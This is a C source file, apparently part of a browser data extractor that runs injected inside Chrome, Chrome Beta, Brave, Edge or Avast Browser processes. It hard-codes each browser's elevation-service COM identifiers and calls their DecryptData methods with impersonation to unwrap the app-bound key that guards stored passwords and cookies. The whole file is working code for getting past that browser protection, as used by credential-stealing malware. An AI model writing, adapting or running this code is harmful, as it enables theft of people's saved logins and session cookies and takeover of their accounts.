#include <Windows.h>
#include <ShlObj.h>
#include <stdio.h>
#include <string.h>
#include "Elevator.h"
#include "Extractor.h"
#include "Memory\Memory.h"

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

const GUID IID_ChromeIElevator =        {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}};
const GUID IID_ChromeIElevator2 =       {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};
const GUID CLSID_ChromeElevator =       {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}};

const GUID IID_ChromeBetaIElevator =    {0xA2721D66, 0x376E, 0x4D2F, {0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F}};
const GUID IID_ChromeBetaIElevator2 =   {0xB96A14B8, 0xD0B0, 0x44D8, {0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54}};
const GUID CLSID_ChromeBetaElevator =   {0xDD2646BA, 0x3707, 0x4BF8, {0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2}};

const GUID IID_BraveIElevator =         {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}};
const GUID IID_BraveIElevator2 =        {0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38}};
const GUID CLSID_BraveElevator =        {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}};

const GUID IID_EdgeIElevator =          {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}};
const GUID IID_EdgeIElevator2 =         {0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05}};
const GUID CLSID_EdgeElevator =         {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}};

const GUID IID_AvastIElevator =         {0x7737BB9F, 0xBAC1, 0x4C71, {0xA6, 0x96, 0x7C, 0x82, 0xD7, 0x99, 0x4B, 0x6F}};
const GUID CLSID_AvastElevator =        {0xEAD34EE8, 0x8D08, 0x4CA1, {0xAD, 0xA3, 0x64, 0x75, 0x43, 0x74, 0xD8, 0x11}};

BrowserCfg g_browser;

BOOL DetectBrowser(void) {
    char processPath[MAX_PATH];
    char processName[MAX_PATH];
    GetModuleFileNameA(NULL, processPath, MAX_PATH);
    const char* slash = strrchr(processPath, '\\');
    if (slash) {
        strcpy_s(processName, MAX_PATH, slash + 1);
    } else {
        strcpy_s(processName, MAX_PATH, processPath);
    }

    if (_stricmp(processName, "chrome.exe") == 0) {
        g_browser.name = "Chrome";
        g_browser.userDataSubPath = "Google\\Chrome\\User Data";
        g_browser.clsid = CLSID_ChromeElevator;
        g_browser.iid = IID_ChromeIElevator;
        g_browser.iid_v2 = IID_ChromeIElevator2;
        g_browser.has_v2 = TRUE;
        g_browser.isEdge = FALSE;
        g_browser.isAvast = FALSE;
        return TRUE;
    }

    if (_stricmp(processName, "brave.exe") == 0) {
        g_browser.name = "Brave";
        g_browser.userDataSubPath = "BraveSoftware\\Brave-Browser\\User Data";
        g_browser.clsid = CLSID_BraveElevator;
        g_browser.iid = IID_BraveIElevator;
        g_browser.iid_v2 = IID_BraveIElevator2;
        g_browser.has_v2 = TRUE;
        g_browser.isEdge = FALSE;
        g_browser.isAvast = FALSE;
        return TRUE;
    }

    if (_stricmp(processName, "msedge.exe") == 0) {
        g_browser.name = "Edge";
        g_browser.userDataSubPath = "Microsoft\\Edge\\User Data";
        g_browser.clsid = CLSID_EdgeElevator;
        g_browser.iid = IID_EdgeIElevator;
        g_browser.iid_v2 = IID_EdgeIElevator2;
        g_browser.has_v2 = TRUE;
        g_browser.isEdge = TRUE;
        g_browser.isAvast = FALSE;
        return TRUE;
    }

    if (_stricmp(processName, "AvastBrowser.exe") == 0) {
        g_browser.name = "Avast";
        g_browser.userDataSubPath = "AVAST Software\\Browser\\User Data";
        g_browser.clsid = CLSID_AvastElevator;
        g_browser.iid = IID_AvastIElevator;
        memset(&g_browser.iid_v2, 0, sizeof(GUID));
        g_browser.has_v2 = FALSE;
        g_browser.isEdge = FALSE;
        g_browser.isAvast = TRUE;
        return TRUE;
    }

    return FALSE;
}

BOOL DecryptKey(const BYTE* encKey, DWORD encKeyLen, BYTE** decKey, DWORD* decKeyLen) {
    HRESULT hr;
    IOriginalBaseElevator* pElevator = 0;
    IOriginalBaseElevator2* pElevator2 = 0;
    IAvastElevator* pAvastElevator = 0;
    IEdgeIntermediateElevator* pEdgeElevator = 0;
    IEdgeElevator2Final* pEdgeElevator2 = 0;
    BSTR bstrEnc = 0;
    BSTR bstrPlain = 0;
    BOOL success = FALSE;
    DWORD comErr = 0;

    hr = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return FALSE;

    bstrEnc = SysAllocStringByteLen((LPCSTR)encKey, encKeyLen);
    if (!bstrEnc) goto cleanup;

    if (g_browser.isAvast) {
        hr = CoCreateInstance(&g_browser.clsid, 0, CLSCTX_LOCAL_SERVER, &g_browser.iid, (void**)&pAvastElevator);
        if (SUCCEEDED(hr)) {
            CoSetProxyBlanket((IUnknown*)pAvastElevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 0,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_DYNAMIC_CLOAKING);
            hr = pAvastElevator->lpVtbl->DecryptData(pAvastElevator, bstrEnc, &bstrPlain, &comErr);
            if (SUCCEEDED(hr)) {
                success = TRUE;
            }
            if (pAvastElevator) pAvastElevator->lpVtbl->Release(pAvastElevator);
        }
    } else if (g_browser.isEdge) {
        if (g_browser.has_v2) {
            hr = CoCreateInstance(&g_browser.clsid, 0, CLSCTX_LOCAL_SERVER, &g_browser.iid_v2, (void**)&pEdgeElevator2);
            if (SUCCEEDED(hr)) {
                CoSetProxyBlanket((IUnknown*)pEdgeElevator2, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 0,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_DYNAMIC_CLOAKING);
                hr = pEdgeElevator2->lpVtbl->DecryptData((IEdgeIntermediateElevator*)pEdgeElevator2, bstrEnc, &bstrPlain, &comErr);
                if (SUCCEEDED(hr)) {
                    success = TRUE;
                }
                if (pEdgeElevator2) pEdgeElevator2->lpVtbl->Release(pEdgeElevator2);
                pEdgeElevator2 = 0;
            }
        }
        if (!success) {
            hr = CoCreateInstance(&g_browser.clsid, 0, CLSCTX_LOCAL_SERVER, &g_browser.iid, (void**)&pEdgeElevator);
            if (SUCCEEDED(hr)) {
                CoSetProxyBlanket((IUnknown*)pEdgeElevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 0,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_DYNAMIC_CLOAKING);
                hr = pEdgeElevator->lpVtbl->DecryptData(pEdgeElevator, bstrEnc, &bstrPlain, &comErr);
                if (SUCCEEDED(hr)) {
                    success = TRUE;
                }
                if (pEdgeElevator) pEdgeElevator->lpVtbl->Release(pEdgeElevator);
            }
        }
    } else {
        if (g_browser.has_v2) {
            hr = CoCreateInstance(&g_browser.clsid, 0, CLSCTX_LOCAL_SERVER, &g_browser.iid_v2, (void**)&pElevator2);
            if (SUCCEEDED(hr)) {
                CoSetProxyBlanket((IUnknown*)pElevator2, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 0,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_DYNAMIC_CLOAKING);
                hr = ((IOriginalBaseElevatorVtbl*)pElevator2->lpVtbl)->DecryptData((IOriginalBaseElevator*)pElevator2, bstrEnc, &bstrPlain, &comErr);
                if (SUCCEEDED(hr)) {
                    success = TRUE;
                } else {
                    ((IOriginalBaseElevatorVtbl*)pElevator2->lpVtbl)->Release((IOriginalBaseElevator*)pElevator2);
                    pElevator2 = 0;
                }
            }
        }

        if (!success) {
            hr = CoCreateInstance(&g_browser.clsid, 0, CLSCTX_LOCAL_SERVER, &g_browser.iid, (void**)&pElevator);
            if (SUCCEEDED(hr)) {
                CoSetProxyBlanket((IUnknown*)pElevator, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, 0,
                    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, 0, EOAC_DYNAMIC_CLOAKING);
                hr = pElevator->lpVtbl->DecryptData(pElevator, bstrEnc, &bstrPlain, &comErr);
                if (SUCCEEDED(hr)) {
                    success = TRUE;
                } else {
                    pElevator->lpVtbl->Release(pElevator);
                    pElevator = 0;
                }
            }
        }
    }

    if (success && bstrPlain) {
        *decKeyLen = SysStringByteLen(bstrPlain);
        *decKey = (BYTE*)Alloc(*decKeyLen);
        if (*decKey) {
            MemCopy(*decKey, bstrPlain, *decKeyLen);
        } else {
            success = FALSE;
        }
    }

cleanup:
    if (bstrPlain) SysFreeString(bstrPlain);
    if (bstrEnc) SysFreeString(bstrEnc);
    CoUninitialize();
    return success;
}
